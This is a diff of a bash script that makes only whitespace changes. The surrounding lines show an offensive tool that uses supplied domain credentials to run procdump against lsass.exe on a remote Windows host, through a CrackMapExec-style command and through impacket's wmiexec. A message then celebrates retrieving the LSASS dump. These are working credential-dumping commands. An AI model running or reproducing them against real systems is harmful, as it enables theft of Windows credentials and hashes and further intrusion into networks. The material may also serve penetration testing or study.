@@ -61,7 +61,7 @@ fi
 while getopts "u:p:d:f:h:P:m:H:" FLAG
 do
     case $FLAG in
-		u)  USERNAME=${OPTARG};;
+    	u)  USERNAME=${OPTARG};;
         p)  PASSWORD=${OPTARG};;
         d)  DOMAIN=${OPTARG};;
         f)
@@ -136,7 +136,7 @@ do
 			$CRACK $TARGETIP -u $USERNAME -p $PASSWORD -d $DOMAIN -x 'cmd.exe /c procdump.exe -accepteula -ma lsass.exe lsass.dmp'
         	fi
 	elif [ "$METHOD" == "wmiexec" ]; then
-        python $WMIEXEC "$DOMAIN"/"$USERNAME":"$PASSWORD"@"$TARGETIP" 'procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp'
+		python $WMIEXEC "$DOMAIN"/"$USERNAME":"$PASSWORD"@"$TARGETIP" 'procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp'
 	fi
 	echo
 	echo "===| Retrieving the dump... Muh dumps, muh dumps. Muh lovely LSASS dumps! |==="
